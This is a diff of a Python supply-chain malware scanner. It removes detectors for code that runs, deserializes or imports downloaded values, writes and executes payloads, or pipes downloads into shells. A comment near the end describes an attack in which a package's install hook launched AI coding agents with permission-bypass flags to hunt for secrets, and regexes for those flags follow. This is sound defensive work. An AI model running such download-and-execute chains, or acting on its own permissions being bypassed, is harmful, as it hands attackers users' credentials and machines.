-            for s, e in zip(self.lit_s, self.lit_e):
-                if row[s] == "`":
-                    holes = _DL_TEMPLATE_HOLE_RE.findall(row, s, e)
-                else:
-                    pre = row[max(self.lo, s - 2):s]
-                    while pre and pre[0] not in _DL_PREFIX_CHARS:
-                        pre = pre[1:]
-                    if "f" not in pre and "F" not in pre:
-                        continue
-                    holes = _DL_FSTRING_HOLE_RE.findall(row, s, e)
-                if holes and any(taint.live(c.group(), k) for c in _DL_CHAIN_RE.finditer(" ".join(holes))):
-                    starts.append(s)
-                    ends.append(e)
-            self.holes = (starts, ends)
-        return self.holes
-
-
-def _dl_chain_index(code, lo=0):
-    """The member chains of `code` (strings blanked) by the names they start
-    with — 'r' and 'r.text' for r.text — as {name: [offset, …]}."""
-    by = {}
-    for m in _DL_CHAIN_RE.finditer(code):
-        c, s = m.group(), m.start() + lo
-        if "." not in c:
-            by.setdefault(c, []).append(s)
-            continue
-        acc = None
-        for part in _DL_DOT_RE.split(c):
-            acc = part if acc is None else acc + "." + part
-            by.setdefault(acc, []).append(s)
-    return by
-
-
-class _DlNamed:
-    """The rows where a name stands whole ([\\w$]+ runs are names). The first
-    _DL_NAMED_SEARCHES names are each found by a search of the text; the
-    rest from an index of its names, built once."""
-
-    def __init__(self, text, rows, starts):
-        self.text, self.rows, self.starts = text, rows, starts
-        self.searches, self.index = 0, None
-
-    def find(self, name):
-        head = name.split(".")[0]
-        if _DL_WORD_RUN_RE.fullmatch(head) is None:
-            return ()
-        if self.index is None and self.searches < _DL_NAMED_SEARCHES:
-            self.searches += 1
-            esc = re.escape(head)
-            rx = re.compile(esc + _DL_NAMED_MID + esc + _DL_NAMED_TAIL)
-            out, text, starts = [], self.text, self.starts
-            m = rx.search(text)
-            while m is not None:
-                k = bisect.bisect_right(starts, m.start()) - 1
-                out.append(k)
-                if k + 1 >= len(starts):
-                    break
-                m = rx.search(text, starts[k + 1])
-            return out
-        if self.index is None:
-            index = {}
-            for k, row in enumerate(self.rows):
-                for word in set(_DL_WORD_RUN_RE.findall(row)):
-                    index.setdefault(word, []).append(k)
-            self.index = index
-        return self.index.get(head, ())
-
-
-def _dl_import_names(rows, cand):
-    """The names a network module is imported under, on the rows `cand`."""
-    out = set()
-    for k in sorted(cand):
-        row = rows[k]
-        if "import" not in row or len(row) > _DL_LONG_ROW:
-            continue
-        for m in _DL_IMPORT_RE.finditer(row):
-            if m.group("py") is not None:
-                for item in m.group("py").split(","):
-                    parts = item.split()
-                    if parts and parts[0] in _DL_PY_NET_MODULES:
-                        out.add(parts[2] if len(parts) == 3 and parts[1] == "as" else parts[0])
-                continue
-            items = m.group("pyfrom") if m.group("pyfrom") is not None else m.group("esn")
-            if items is None:
-                out.add(m.group("es"))
-                continue
-            for item in items.split(","):
-                parts = item.split()
-                if parts:
-                    out.add(parts[2] if len(parts) == 3 and parts[1] == "as" else parts[0])
-    return out
-
-
-def _dl_header(row):
-    """What a row says about the function a `return` below it belongs to:
-    the function's name on a function header, '' on a minified row (the
-    search stops there), None on any other row."""
-    if len(row) > _DL_LONG_ROW:
-        return ""
-    h = _DL_FN_HEADER_RE.search(row)
-    return None if h is None else (h.group("py") or h.group("js") or h.group("var"))
-
-
-def _dl_row_above(rows, k):
-    """The nearest non-blank row above k (in the window), unless minified."""
-    for j in range(k - 1, max(-1, k - _DL_WINDOW - 1), -1):
-        if rows[j].strip():
-            return j if len(rows[j]) <= _DL_LONG_ROW else None
-    return None
-
-
-class _DlRow:
-    """One row (or a minified row's stretch) as runs_received_code reads it:
-    its code (quotes paired from its start) for what it binds, and for its
-    runners' arguments, quotes paired from each call's '(': the row's own
-    pairing where that is in step, else a reading begun at the '(' (at most
-    _DL_PHASES of those), as a language pairs them wherever the row's
-    earlier quotes are something else (an apostrophe in a comment, a regex
-    literal's quote)."""
-    __slots__ = ("reader", "k", "row", "taint", "hi", "top", "phases", "src_s", "src_e", "dirty", "indexed")
-
-    def __init__(self, reader, k, row, lo, hi, taint, sources, top=True):
-        self.reader, self.k, self.row, self.taint, self.hi = reader, k, row, taint, hi
-        self.top = _DlCode(row, lo, hi) if top else None
-        self.phases = [self.top] if top else []
-        self.src_s = [s for s, _e in sources]            # (start, end) of the sources read, sorted
-        self.src_e = [e for _s, e in sources]
-        self.dirty = False                               # can a chain here be live?
-        self.indexed = []                                # the codes whose chains are indexed
-
-    def live(self, seg):
-        """The sorted offsets of seg's chains the taint reaches (indexed on first use)."""
-        if seg.by is None:
-            seg.index(self.taint, self.k)
-            self.indexed.append(seg)
-        return seg.live
-
-    def bound(self, name):
-        """`name` is now live: the chains it starts are too."""
-        for seg in self.indexed:
-            seg.bound(name)
-
-    def phase_at(self, o):
-        """The code a call's '(' at offset o is read in: one where it is not
-        in a literal, else a reading begun there (None past _DL_PHASES)."""
-        for ph in self.phases:
-            if ph.lo <= o < ph.hi and ph.literal_at(o) < 0:
-                return ph
-        if len(self.phases) - (self.top is not None) >= _DL_PHASES:
-            return None
-        ph = _DlCode(self.row, o, self.hi)
-        self.phases.append(ph)
-        return ph
-
-    def runs(self, r, taint, alias=False):
-        """Is the runner call `r` handed a received value (taint None: a
-        download only) — as an argument, or written into an interpreter's
-        command line? (`alias`: a call of a runner alias, which runs code
-        whatever its name — a `run` alias is not subprocess.run.)"""
-        row, k = self.row, self.k
-        if _dl_defined_here(row, r.start()):
-            return False                                # def exec(…), function exec(…)
-        if not alias and _DL_SHELL_CALL_RE.fullmatch(r.group()) and not self.reader.shell_within(k, row, r.end()):
-            return False                                # run(…) without shell=True
-        o = r.end() - 1
-        if o >= self.hi:
-            return False                                # its '(' is past what is read
-        ph = self.phase_at(o)
-        if ph is None:
-            return False
-        ph.brackets()
-        end = min(ph.hi, o + 1 + _DL_ARG_SPAN)
-        c = ph.close.get(o)
-        close = c if c is not None and c < end else None
-        if close is not None and row[close + 1:close + 3].lstrip()[:1] == "{":
-            return False                                # a method definition: exec(x) {
-        starts, ends = [o + 1], []
-        for x in ph.commas.get(o, ()):
-            if x >= end:
-                break
-            ends.append(x)
-            starts.append(x + 1)
-        ends.append(end if close is None else close)
-        src_s, src_e = self.src_s, self.src_e
-        if taint is not None and self.dirty:
-            live, holes = self.live(ph), ph.live_holes(taint, k)
-        else:
-            live, holes = (), ((), ())
-        # each argument's value, read to its end, or where the call's are cut, as
-        # _dl_carried reads it; one with nothing received in it is not read
-        last = len(starts) - 1
-        for i, (s, e) in enumerate(zip(starts, ends)):
-            if close is None and i == last:
-                e = min(self.hi, _DL_LEAD_RE.match(row, s).end() + _DL_ARG_SPAN)
-            if (_dl_any(src_s, s, e) or _dl_any(live, s, e)) and _dl_carried(row, s, taint, k):
-                return True
-        s, e = starts[0], ends[0]
-        if _DL_EMBED_RE.match(row, s, e) is None:
-            return False
-        return _dl_within(src_s, src_e, s, e) or _dl_any(live, s, e) or _dl_within(holes[0], holes[1], s, e)
-
-
-class _DlReader:
-    """runs_received_code's pass over the rows: what each row binds, and
-    whether it runs a received value."""
-
-    def __init__(self, text, rows, starts, taint, sources, runners, named, seeds, sinks):
-        self.text, self.rows, self.starts, self.taint = text, rows, starts, taint
-        self.sources, self.runners, self.named, self.seeds = sources, runners, named, seeds
-        # extra sink families to scan, as (category, alternatives): deserialize
-        # and dynamic import, each added only when the file names one
-        self.sinks = sinks
-        self.aliases = {}                                # runner-alias name -> [definition rows]
-        self.alias_call = None                           # a call of any runner alias, or None
-        self.until = -1
-        self.headers = {}                                # row -> _dl_header, as read
-        self.last_top = (-1, None)                       # the row read last, and its code
-        self.shell_row, self.shell = -1, ()              # offsets of `shell=True` on that row
-
-    def shell_within(self, k, row, i):
-        """Does a `shell=True` start within _DL_ARG_SPAN characters after row[i]?"""
-        if self.shell_row != k:
-            self.shell_row, self.shell = k, [m.start() for m in _DL_SHELL_ARG_RE.finditer(row)]
-        return _dl_any(self.shell, i, i + _DL_ARG_SPAN + 1)
-
-    def short_row(self, k, row):
-        """Read a row of ordinary length; the category it runs a received value
-        as (see runs_received_code), or None."""
-        taint, rows = self.taint, self.rows
-        heads = taint.heads
-        found = bool(heads) and not heads.isdisjoint(_DL_HEAD_RE.findall(row))
-        hot = k in self.sources
-        above = _dl_row_above(rows, k) if row.lstrip()[:1] == "." else None
-        if not (hot or found or (above is not None and (above in self.sources or (
-                bool(heads) and not heads.isdisjoint(_DL_HEAD_RE.findall(rows[above])))))):
-            return None                                  # names nothing received: binds and runs none
-        srcs = [m.span() for m in _dl_finditer(_DL_SOURCE, row)] if hot else []
-        rd = _DlRow(self, k, row, 0, len(row), taint, srcs)
-        rd.dirty = found
-        top = rd.top
-        # [kind, lo, hi, match or names, continued, code]: what a fact binds from
-        # row[lo:hi], its sources anywhere there, its chains in the code it is in
-        facts = []
-        semi = -1
-        binds = _DL_BIND_RE.finditer(row) if ("=" in row or "as" in row or "for" in row or "return" in row) else ()
-        for m in binds:
-            seg = top.segment_at(m.start())
-            if m.group("ann") is not None or m.group("lhs") or m.group("ret") is not None:
-                lo = m.end()
-                if semi < lo:
-                    semi = row.find(";", lo)
-                    semi = len(row) if semi < 0 else semi
-                kind, lo, hi = ("return" if m.group("ret") is not None else "bind"), lo, semi
-            elif m.group("with"):
-                kind, lo, hi = "with", 0, m.start()
-            else:
-                kind, lo, hi = "for", m.end(), len(row)
-            facts.append([kind, lo, hi, m, False, seg])
-        params, queries = [], {}
-        for m in (_DL_PARAMS_RE.finditer(row) if ("=>" in row or "function" in row or "lambda" in row) else ()):
-            ps = m.group("fp") or m.group("ap") or m.group("one") or m.group("lp") or ""
-            names = [n for n in _DL_NAME_RE.findall(_DL_DEFAULT_RE.sub("", ps)) if n not in _DL_NOT_NAMES]
-            if names:
-                seg = top.segment_at(m.start())
-                params.append((m.start(), names, seg))
-                queries.setdefault(id(seg), (seg, []))[1].append(m.start())
-        for seg, offsets in queries.values():
-            seg.brackets(offsets)
-        first = len(row) - len(row.lstrip())
-        for p, names, seg in params:
-            j = seg.open_paren.get(p)
-            start = None if j is None else seg.expr_start(j)
-            if start is None:
-                continue
-            continued = seg is top and start <= first < j and row[first] == "."
-            facts.append(["param", start, j, names, continued, seg])
-        # which facts hold a received value; binding their names can feed the others
-        above_by, above_live = None, False
-        if above is not None and any(f[4] for f in facts):
-            if above in self.sources:
-                above_live = True
-            else:
-                j, code = self.last_top
-                if j == above and code.by is not None:
-                    above_by = code.by                   # (read just now: its chains are indexed)
-                else:
-                    a_row = rows[above]
-                    above_by = _dl_chain_index(_DlCode(a_row, 0, len(a_row)).code)
-                above_live = any(taint.name_live(n, k) for n in above_by)
-        added = []
-        pending = facts
-        for _ in range(3):
-            grew = False
-            rest = []
-            for f in pending:
-                lo, hi, seg = f[1], f[2], f[5]
-                if not (_dl_within(rd.src_s, rd.src_e, lo, hi) or (f[4] and above_live)
-                        or (rd.dirty and _dl_any(rd.live(seg), lo, hi))):
-                    rest.append(f)
-                    continue
-                names, how = self._names(f, row, k)
-                for name in names:
-                    if how == "always":
-                        if name in taint.always:
-                            continue
-                        taint.always.add(name)
-                        added.append(name)
-                    elif taint.at.get(name) != k:
-                        taint.at[name] = k
-                        self.until = max(self.until, k + _DL_WINDOW)
-                    else:
-                        continue
-                    grew = rd.dirty = True
-                    taint.heads.add(name.split(".")[0])
-                    rd.bound(name)
-                    if above_by is not None and name in above_by:
-                        above_live = True
-            pending = rest
-            if not grew:
-                break
-        for name in added:
-            for r in self.named.find(name):
-                if r > k:
-                    self.seeds[r] = 1
-        self.last_top = (k, top)
-        # its runners, with what it binds
-        for r in _dl_finditer(self.runners, row):
-            if rd.runs(r, taint):
-                return "run"
-        for r in _dl_finditer(_DL_INTERP, row):
-            if _dl_carried(row, r.end(), taint, k):
-                return "run"
-        from_import = bool(self.sinks) and _DL_FROM_IMPORT_RE.match(row) is not None
-        for cat, sink in self.sinks:                      # deserialize, import
-            for r in _dl_finditer(sink, row):
-                if from_import and _DL_BARE_IMPORT_RE.fullmatch(r.group()):
-                    continue                              # a Python from-import list, not import()
-                if rd.runs(r, taint):
-                    return cat
-        if self.alias_call is not None:                   # a call of a runner alias near its definition
-            for r in self.alias_call.finditer(row):
-                if _dl_alias_near(self.aliases[r.group(1)], k) and rd.runs(r, taint, alias=True):
-                    return "run"
-        return None
-
-    def _names(self, f, row, k):
-        """(names, how) a fact that holds a received value binds: how is
-        'value' (followed for _DL_WINDOW rows) or 'always'."""
-        kind = f[0]
-        if kind == "param":
-            return f[3], "value"
-        m = f[3]
-        if kind == "bind":
-            names = [m.group("ann")] if m.group("ann") is not None else _dl_lhs_names(m.group("lhs"))
-            names = [n for n in names if n not in _DL_NOT_NAMES]
-            if len(names) == 1 and "." not in names[0]:
-                lo, hi = f[1], f[2]
-                if _DL_MODULE_VALUE_RE.match(row, lo, hi):
-                    return names, "always"
-                if len(names[0]) >= 3 and _DL_FUNCTION_VALUE_RE.match(row, lo, hi):
-                    return names, "always"             # const load = (u) => fetch(u)
-            return names, "value"
-        if kind == "with":
-            return [m.group("with")], "value"
-        if kind == "for":
-            return _dl_lhs_names(m.group("for")), "value"
-        # return VALUE: the function whose header is nearest above carries it
-        fn = self.function_above(k)
-        return ([fn] if fn and len(fn) >= 3 else []), "always"
-
-    def function_above(self, k):
-        """The function a `return` on row k belongs to: the name on the
-        nearest function header at or above it within _DL_WINDOW rows ('' past
-        a minified row), else None."""
-        headers, rows = self.headers, self.rows
-        for j in range(k, max(-1, k - _DL_WINDOW - 1), -1):
-            h = headers.get(j, headers)
-            if h is headers:
-                h = headers[j] = _dl_header(rows[j])
-            if h is not None:
-                return h
-        return None
-
-    def long_row(self, k, row):
-        """Read a minified row: only a download written straight into a
-        sink's arguments, a sink that starts within _DL_LOOKBACK characters
-        before a network name (the stretches merged: one pass at most). The
-        category it runs a received value as, or None."""
-        stretches = []
-        for n in _DL_NEEDLE_RE.finditer(row):
-            lo = max(0, n.start() - _DL_LOOKBACK)
-            if stretches and lo <= stretches[-1][1]:
-                stretches[-1][1] = n.start()
-            else:
-                stretches.append([lo, n.start()])
-        families = [("run", self.runners)] + list(self.sinks)
-        from_import = bool(self.sinks) and _DL_FROM_IMPORT_RE.match(row) is not None
-        for lo, hi in stretches:
-            end = min(len(row), hi + 3 * _DL_ARG_SPAN)     # a sink's name, its arguments, the last one's value
-            rd = None
-            search_end = min(end, hi + _DL_ARG_SPAN)
-            for cat, family in families:
-                for r in _dl_finditer(family, row, lo, search_end):
-                    if r.start() >= hi:
-                        break
-                    if from_import and cat == "import" and _DL_BARE_IMPORT_RE.fullmatch(r.group()):
-                        continue                           # a Python from-import list, not import()
-                    if rd is None:
-                        rd = _DlRow(self, k, row, lo, end, None,
-                                    [m.span() for m in _dl_finditer(_DL_SOURCE, row, lo, end)], top=False)
-                    if rd.runs(r, None):
-                        return cat
-            for r in _dl_finditer(_DL_INTERP, row, lo, search_end):
-                if r.start() >= hi:
-                    break
-                if _dl_carried(row, r.end(), None, k):
-                    return "run"
-        return None
-
-
-def _dl_runner_aliases(rows):
-    """{name: [definition rows]} for names bound to a direct code-runner
-    reference (see _DL_ALIAS_RE): a call of one within _DL_WINDOW rows below
-    its definition is a runner. Window-scoped like a received value, so a
-    short name reused far away (`const F = Function` in a bundle) is not a
-    runner everywhere. Read from rows naming a runner and holding '='; at
-    most _DL_ALIAS_MAX names are kept."""
-    defs = {}
-    for k, row in enumerate(rows):
-        if "=" not in row or len(row) > _DL_LONG_ROW or not any(nd in row for nd in _DL_ALIAS_NEEDLES):
-            continue
-        for m in _DL_ALIAS_RE.finditer(row):
-            name = m.group("alias")
-            if name in _DL_NOT_NAMES:
-                continue
-            if name not in defs:
-                if len(defs) >= _DL_ALIAS_MAX:
-                    continue
-                defs[name] = []
-            defs[name].append(k)
-    return defs
-
-
-def _dl_alias_near(def_rows, k):
-    """Is a definition row at or within _DL_WINDOW rows above k? (None: a
-    runner of another file of the package, a runner everywhere.)"""
-    if def_rows is None:
-        return True
-    i = bisect.bisect_right(def_rows, k) - 1
-    return i >= 0 and k - def_rows[i] <= _DL_WINDOW
-
-
-def _received_code_kind(text, extra_always=(), extra_runners=()):
-    """(1-based line, category) for the first place code runs, deserializes or
-    imports a value it received over the network (see runs_received_code), or
-    None. Category is 'run', 'deserialize' or 'import'.
-
-    extra_always: names known from another file of the same package to hold or
-    return a received value (the cross-file follower,
-    _cross_file_received_issues). They are seeded exactly like this file's own
-    network-module import names, so a sink that runs one fires. extra_runners:
-    names of another file's functions that run their argument as code (the
-    follower's too): a call of one is a runner, like a runner alias defined
-    anywhere. Both empty by default, so single-file behaviour is unchanged.
-
-    The text is read a second time with its multi-row statements joined, its
-    environment variables and members read as names and a runner handed to a
-    call read as the call it makes (_dl_logical) when the first reading finds
-    nothing; the line is then the one the statement starts on."""
-    if not extra_runners and not any(n in text for n in _DL_SINK_NEEDLES):
-        return None
-    if not extra_always and not any(n in text for n in _DL_NEEDLES):
-        return None
-    res = _dl_kind(text, extra_always, extra_runners)
-    if res is not None or len(text) > _DL_LOGICAL_MAX_CHARS:
-        return res
-    alt, firsts = _dl_logical(text, extra_runners)
-    if alt == text:
-        return None
-    res = _dl_kind(alt, extra_always, extra_runners)
-    if res is None:
-        return None
-    return (res[0] if firsts is None else firsts[res[0] - 1] + 1), res[1]
-
-
-def _dl_kind(text, extra_always, extra_runners=()):
-    """_received_code_kind's reading of `text` (its gates passed)."""
-    rows = text.split("\n")
-    starts, at = [], 0
-    for row in rows:
-        starts.append(at)
-        at += len(row) + 1
-    near = set()                                        # rows holding a network name
-    m = _DL_NEEDLE_RE.search(text)
-    while m is not None:
-        k = bisect.bisect_right(starts, m.start()) - 1
-        near.add(k)
-        m = _DL_NEEDLE_RE.search(text, starts[k + 1]) if k + 1 < len(starts) else None
-    taint = _DlTaint(list(_dl_import_names(rows, near) if "import" in text else ()) + list(extra_always))
-    sources = {k for k in near
-               if len(rows[k]) > _DL_LONG_ROW or next(_dl_finditer(_DL_SOURCE, rows[k]), None) is not None}
-    if not taint.always and not sources:
-        return None
-    named = _DlNamed(text, rows, starts)
-    seeds = bytearray(len(rows))                        # rows where a received value can start
-    for r in sources:
-        seeds[r] = 1
-    for name in taint.always:
-        for r in named.find(name):
-            seeds[r] = 1
-    aliases = _dl_runner_aliases(rows) if any(nd in text for nd in _DL_ALIAS_NEEDLES) else {}
-    for name in extra_runners:                          # another file's runner: a runner everywhere here
-        aliases[name] = None
-    alias_call = None
-    if aliases:                                         # a call of a runner alias, near its definition, is a runner
-        alias_call = re.compile(_DL_ALIAS_CALL_HEAD + "|".join(re.escape(n) for n in sorted(aliases))
-                                + _DL_ALIAS_CALL_TAIL)
-        for name, def_rows in aliases.items():
-            for r in named.find(name):
-                seeds[r] = 1
-    shell_on = "shell" in text and _DL_SHELL_TRUE_RE.search(text) is not None
-    runners = _DL_RUNNER_SHELL if shell_on else _DL_RUNNER
-    sinks = []                                          # the extra sink families this file names
-    if any(n in text for n in _DL_DESERIAL_NEEDLES):
-        sinks.append(("deserialize", _DL_DESERIAL))
-    if any(n in text for n in _DL_IMPORT_NEEDLES):
-        sinks.append(("import", _DL_IMPORT_SINK))
-    reader = _DlReader(text, rows, starts, taint, sources, runners, named, seeds, sinks)
-    reader.aliases, reader.alias_call = aliases, alias_call
-    # Rows are read in order, from a seed on for _DL_WINDOW rows (and as long
-    # as a value is bound): a row outside every such stretch can neither bind
-    # a received value nor run one, so it is skipped.
-    k = seeds.find(1)
-    k = len(rows) if k < 0 else k
-    while k < len(rows):
-        row = rows[k]
-        if len(row) > _DL_LONG_ROW:
-            cat = reader.long_row(k, row)
-            if cat:
-                return k + 1, cat
-        else:
-            if seeds[k]:
-                reader.until = max(reader.until, k + _DL_WINDOW)
-            cat = reader.short_row(k, row)
-            if cat:
-                return k + 1, cat
-        nk = k + 1
-        if nk > reader.until:
-            nk = seeds.find(1, nk)
-            nk = len(rows) if nk < 0 else nk
-        k = nk
-    return None
-
-
-def runs_received_code(text):
-    """The 1-based line where code runs, deserializes or dynamically imports a
-    value it received over the network (see the section comment), else None.
-    `text` has \\n line endings."""
-    res = _received_code_kind(text)
-    return res[0] if res is not None else None
+    "sends the machine's user or host name in a DNS lookup",
+    "sends the machine's user or host name to an address it fetches",
+    "runs a cryptocurrency miner", "swaps the cryptocurrency wallet addresses",
+    "hides its code in a string array", "runs a program it extracts from inside another file")
 
 
 # ---------------- Download to a file, then run the file ----------------
-# A weaker, MAJOR-only signal (SC-IMPORT-RISK, never CRITICAL, and never
-# escalating an install hook): a received value written to a file, and that
-# same file then run — subprocess.run([sys.executable, dropped]), os.system(p),
-# require(p), spawn('node', [p]). This shape is statically identical to what a
-# prebuilt-binary installer does (node-pre-gyp / prebuild-install /
-# node-gyp-build / esbuild download a platform binary and then run it), so it
-# is deliberately not part of install_script_risk (which escalates a hook to
-# CRITICAL): it is a capability to review, not a verdict.
-# Kept precise by three requirements: a real network source within the window,
-# a file WRITE naming a path, and a RUN of that same path (a name, or the same
-# string literal) in the window after it. `text` costs one pass: only rows near
-# a write are read, and each search is bounded.
-# a received value written to a file, naming the path (a download-to-file API,
-# or a write whose window holds a source); the run of that path is the opener
-# of an interpreter/exec/require/import/subprocess call. Both patterns and the
-# path-token grammar are in the spec (p4, urlretrieve, and p5, curl or wget
-# given `-o path` in an argument list, 0.1.8, are a download to a file on
-# their own and need no separate source).
-_DL_FILE_WRITE_RE = _dl_re("_DL_FILE_WRITE_RE")
-_DL_FILE_WRITE_NEEDLES = tuple(_DL_SPEC_ARRAYS["_DL_FILE_WRITE_NEEDLES"])
-_DL_PATHRUN_SINK_RE = _dl_re("_DL_PATHRUN_SINK_RE")
-_DL_PATHRUN_NEEDLES = tuple(_DL_SPEC_ARRAYS["_DL_PATHRUN_NEEDLES"])
-
-
-def _dl_norm_path(tok):
-    """A path token with its surrounding quotes and a leading "./" dropped, so
-    a name and the literal that names the same file compare equal."""
-    if tok[:1] in "\"'":
-        tok = tok[1:-1]
-        while tok[:2] == "./":
-            tok = tok[2:]
-    return tok
-
-
-def _dl_path_token(m):
-    """The normalized path token a _DL_FILE_WRITE_RE match names."""
-    return _dl_norm_path(next(g for g in m.groups() if g is not None))
-
-
-def _dl_region_names_path(region, path):
-    """Does `region` (a run sink's arguments) name the file `path` — as the
-    same identifier, or as a string literal for the same file?"""
-    for m in _DL_NAME_RE.finditer(region):
-        if m.group() == path:
-            return True
-    for m in _DL_STR_RE.finditer(region):
-        if _dl_norm_path(m.group()) == path:
-            return True
-    return False
 
 
 def _downloads_and_runs_file(text):
     """The 1-based line where a received value is written to a file that is then
-    run (see the section comment), else None. MAJOR only, except in the Python
-    code pip runs to install an sdist (the registry)."""
+    run (the engine's downloads_and_runs), else None. MAJOR only, except in the
+    Python code pip runs to install an sdist (the registry)."""
     res = _downloads_and_runs(text)
     return None if res is None else res[0]
 
 
-# The shell or interpreter a written file is run with (0.1.8). A script a
-# shell or an interpreter runs — subprocess.run(['/bin/bash', path]),
-# spawn('node', [path]), os.system('sh ' + path), require(path) — is a
-# download piped into a shell in two steps, and is CRITICAL wherever it is
-# found (ptmpl's post_install.py downloaded a .sh, made it executable and ran
-# it with bash). A file run on its own (a binary, started by its path) keeps
-# the MAJOR shape a prebuilt binary's installer shares, and so does one
-# require()d: a native addon (.node) is loaded that way.
-_SCRIPT_INTERP_RE = re.compile(
-    r"""(?:^|(?<=[\s\[(,'"`/\\]))(?P<name>bash|sh|zsh|dash|ksh|node|nodejs|deno|bun|pwsh|powershell|perl|ruby"""
-    r"""|php|osascript|cscript|wscript)(?:\.exe)?(?=['"`\s,\])])""")
-_SCRIPT_LOAD_RE = re.compile(r"""\b(?P<fork>fork)\s*\(|\b(?:execfile|run_path)\s*\(|(?<![\w$.])exec\s*\(\s*open\s*\(""")
-
-
-def _dl_run_interp(row):
-    """The shell or interpreter the run on `row` uses, else None: a named
-    one, node for child_process.fork (which runs a module with Node.js), or
-    Python for execfile / runpy.run_path / exec(open(…))."""
-    m = _SCRIPT_INTERP_RE.search(row)
-    if m is not None:
-        return m.group("name")
-    m = _SCRIPT_LOAD_RE.search(row)
-    if m is None:
-        return None
-    return "node" if m.group("fork") else "Python"
-
-
-def _dl_written_and_run(rows, is_src, downloads):
-    """The row index that runs a file written in the window of a row for
-    which is_src(row) holds, else None. `downloads`: urlretrieve, a download
-    to a file on its own, counts without a source row. (The source rows are
-    looked for only around a write: a bundle has few writes and 80,000 rows.)"""
-    known = {}
-
-    def src(j):
-        got = known.get(j)
-        if got is None:
-            got = known[j] = len(rows[j]) <= _DL_LONG_ROW and is_src(rows[j])
-        return got
-
-    n = len(rows)
-    for k, row in enumerate(rows):
-        if len(row) > _DL_LONG_ROW or not any(n_ in row for n_ in _DL_FILE_WRITE_NEEDLES):
-            continue
-        near_src = None
-        for wm in _DL_FILE_WRITE_RE.finditer(row):
-            if wm.group("p4") is None and wm.group("p5") is None:
-                if near_src is None:
-                    near_src = any(src(j) for j in range(max(0, k - _DL_WINDOW), min(n, k + _DL_WINDOW + 1)))
-                if not near_src:
-                    continue                             # a plain write needs a source in its window
-            elif not downloads:
-                continue
-            path = _dl_path_token(wm)
-            if not path:
-                continue
-            hit = _dl_pathrun_after(rows, k, path)
-            if hit is not None:
-                return hit
-    return None
-
-
-def _downloads_and_runs(text):
-    """(line, interpreter or None): where a received value is written to a
-    file that is then run (see the section comment), and the shell or
-    interpreter that runs it (_dl_run_interp); None when there is none."""
-    if (not any(n in text for n in _DL_NEEDLES) or not any(n in text for n in _DL_FILE_WRITE_NEEDLES)
-            or not any(n in text for n in _DL_PATHRUN_NEEDLES)):
-        return None
-    rows = text.split("\n")
-    # rows holding a network source (a plain write must be near a real download;
-    # urlretrieve is a download-to-file on its own)
-    hit = _dl_written_and_run(rows, lambda row: next(_dl_finditer(_DL_SOURCE, row), None) is not None, True)
-    return None if hit is None else (hit + 1, _dl_run_interp(rows[hit]))
-
-
-def _decodes_and_runs(text):
-    """(line, interpreter or None) where a value the file decodes — a decode
-    call (_DECODE_CALL_RE: b64decode, atob, Buffer.from(…, 'base64'),
-    fromhex, unhexlify, zlib.decompress, a cipher's decrypt) in the window
-    of a file write — is written to that file and the file is then run,
-    else None. litellm 1.82.7's proxy_server.py wrote a base64 payload to
-    p.py and ran it with sys.executable when the proxy was imported."""
-    if (not any(n in text for n in _DL_FILE_WRITE_NEEDLES) or not any(n in text for n in _DL_PATHRUN_NEEDLES)
-            or _DECODE_CALL_RE.search(text) is None):
-        return None
-    rows = text.split("\n")
-    hit = _dl_written_and_run(rows, lambda row: _DECODE_CALL_RE.search(row) is not None, False)
-    return None if hit is None else (hit + 1, _dl_run_interp(rows[hit]))
-
-
-def _dl_pathrun_after(rows, k, path):
-    """The row index in [k, k+_DL_WINDOW] that runs the file named `path`
-    (the same name, or the same string literal in a run sink's arguments),
-    else None."""
-    end = min(len(rows), k + _DL_WINDOW + 1)
-    for j in range(k, end):
-        row = rows[j]
-        if len(row) > _DL_LONG_ROW or not any(n in row for n in _DL_PATHRUN_NEEDLES):
-            continue
-        for sm in _DL_PATHRUN_SINK_RE.finditer(row):
-            if _dl_region_names_path(row[sm.end():sm.end() + _DL_ARG_SPAN], path):
-                return j
-    return None
-
-
-# SC-PIPE-SHELL: a project's own code that runs a download piped into a shell
-# (analyst gap: a bin script running `curl … | bash` passed a project scan,
-# while the registry's import-time test catches it in a package). The same
-# line test as the import-time one; a dependency's code gets that test
-# instead (SC-IMPORT-RISK), so this rule is for first-party code.
-_PIPE_SHELL_RULE = {
-    "id": "SC-PIPE-SHELL", "name": "Download piped into a shell", "type": "HOTSPOT", "sev": "MAJOR",
-    "msg": "Code runs a downloaded script through a shell.",
-    "why": ("Piping a download into a shell runs whatever the server sends at that moment, with the "
-            "program's privileges: nothing pins or checks it, so the server, or anyone who can change "
-            "what it serves, decides what runs. Installers publish the line for people to paste once, "
-            "after reading the script; code that runs it hands every run to that server."),
-    "fix": "Download a pinned version, check its checksum or signature, and run that file; or drop the download.",
-    "ref": "CWE-494 · Supply chain"}
-
-
 # ---------------- Dependency drives your AI agent (SC-AGENT-HIJACK) ----------------
-# A dependency that launches the user's own AI coding agent in an autonomous
-# mode, to do the attacker's bidding, is the s1ngularity / Nx attack (Aug
-# 2025, the first weaponized-AI-agent malware): a postinstall spawned
-# `claude --dangerously-skip-permissions`, `gemini --yolo` and
-# `q --trust-all-tools` with a prompt telling the agent to search the disk for
-# secrets, wallets and SSH keys and write them out. A package has no reason to
-# run your agent, and none at all to run it with the flag that turns off every
-# confirmation. Dependency-only: an install-hook script or import-time code
-# that hands a known agent CLI, with such a flag, to an exec/spawn call (your
-# own automation driving your agent is your business). The bypass FLAG is the
-# signal — on 118k real files only the agent tools themselves name these flags,
-# and never next to an exec call — and a known agent name confirms it.
-_AGENT_NAMES = r"claude|gemini|codex|aider|cline|opencode|cursor-agent|amazon-?q|qchat|q"
-# In code a spawned binary is a string literal (a spawn target, "claude", or a
-# command string, "claude --yolo"): require a quote before it, so a minified
-# variable that happens to be named q is not one (a real false positive:
-# @anthropic-ai/claude-code's minified cli.js packs a `q` variable, the flag
-# string and an exec on one line). An install-hook COMMAND is a bare shell
-# string, so there the binary is a shell token instead.
-_AGENT_BIN_SRC = r"""(?<=["'])(?:""" + _AGENT_NAMES + r""")(?=["'\s])"""
-_AGENT_BIN_CMD_SRC = r"(?<![\w./-])(?:" + _AGENT_NAMES + r")(?![\w./-])"
-_AGENT_FLAG_SRC = (r"--(?:dangerously-skip-permissions|yolo|trust-all-tools"
-                   r"|dangerously-bypass-approvals-and-sandbox|full-auto|yes-always|allow-all-tools)(?![\w-])"
-                   r"|--(?:approval-mode|permission-mode)[=\s]+(?:yolo|bypassPermissions)")
-_AGENT_BIN_RE = re.compile(_AGENT_BIN_SRC)
